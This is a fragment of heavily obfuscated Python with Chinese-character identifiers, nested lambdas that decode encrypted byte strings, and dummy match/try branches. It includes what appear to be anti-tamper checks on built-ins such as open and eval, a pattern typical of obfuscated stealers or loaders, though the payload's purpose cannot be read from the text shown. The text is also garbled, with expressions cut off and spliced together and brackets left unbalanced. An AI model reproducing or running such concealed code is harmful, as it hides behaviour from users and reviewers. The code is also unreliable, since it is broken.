樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '峰缂聽鸞宣驄' == '瓷魩掽堑誻谶':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            蕧廱巡挣陴嚻 = [[True], [False]]
            暽掇財豥硿淳(['穷殎匂麈酁蠈'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 冈瓧芌礙贉鮄:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                骼憨訩閡猏釴 = [[(lambda: (lambda 府嘇褐癝暅蹵: 府嘇褐癝暅蹵 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 婶稟斷瑞脈骻: 婶稟斷瑞脈骻 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 勿搋藏鱏珒鿵:
        if str(type(open)) != (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd7'))()]))))())())():
            [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '嗄洺嗲觌塋鹛' == '跍蕳涞錝儑璓':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            杶偭砡薡拣柠 = [[True], [False]]
            暽掇財豥硿淳(['慇瑖鷀臯纅枎'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 譸阊榥利榖罋:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                罛翟孷州薲緙 = [[(lambda: (lambda 廤鶁箋顅詝藵: 廤鶁箋顅詝藵 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 割衜甯犸杵裝: 割衜甯犸杵裝 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 孰齪渟汬嫌眨:
        if str(eval((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))()]))))())())())) != (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd7'))()]))))())())():
            [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 